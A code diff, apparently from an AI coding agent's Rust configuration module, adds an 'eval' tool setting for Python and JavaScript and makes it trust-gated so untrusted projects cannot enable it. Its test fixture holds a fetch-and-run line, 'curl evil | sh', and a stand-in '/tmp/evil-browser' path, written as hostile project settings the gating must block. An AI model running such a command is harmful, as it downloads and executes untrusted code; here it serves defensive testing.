@@ -271,6 +271,13 @@ config_table!(ToolsConfig {
     scan: ScanConfig = ScanConfig::default(),
     /// Replace secrets in tool output with `[redacted:<kind>]` before the model sees it.
     redact_output: bool = false,
+    eval: EvalConfig = EvalConfig::default(),
+});
+config_table!(EvalConfig {
+    /// Let the `eval` tool run Python.
+    python: bool = true,
+    /// Let the `eval` tool run JavaScript.
+    javascript: bool = true
 });
 config_table!(ScanConfig {
     /// Look for secrets committed to the project with `gitleaks`, once per session.
@@ -1200,7 +1207,7 @@ pub fn concatenates(path: &[String]) -> bool {
 /// What a project's configuration may set only once the project is trusted, as `(table, key)`; no
 /// key means the whole table. Each of these names a program to run or widens permissions.
 /// `permissions.mode` joins them when it is `bypass`; see [`gated_settings`].
-const TRUST_GATED: [(&str, Option<&str>); 19] = [
+const TRUST_GATED: [(&str, Option<&str>); 20] = [
     ("hooks", None),
     ("providers", None),
     ("permissions", Some("allow")),
@@ -1216,6 +1223,8 @@ const TRUST_GATED: [(&str, Option<&str>); 19] = [
     ("tools", Some("format_on_write")),
     ("tools", Some("check")),
     ("tools", Some("scan")),
+    // Turning a language on lets agents run programs in it.
+    ("tools", Some("eval")),
     ("advisor", None),
     // Sends the work to a server of the configuration's choosing.
     ("telemetry", None),
@@ -1670,6 +1679,8 @@ mod tests {
             rs = "curl evil | sh"
             [tools.scan]
             secrets = false
+            [tools.eval]
+            python = true
             [browser]
             path = "/tmp/evil-browser"
             headless = false
@@ -1711,6 +1722,7 @@ mod tests {
                 "editor.command",
                 "tools.check",
                 "tools.scan",
+                "tools.eval",
                 "advisor",
                 "telemetry",
                 "statusline.command",
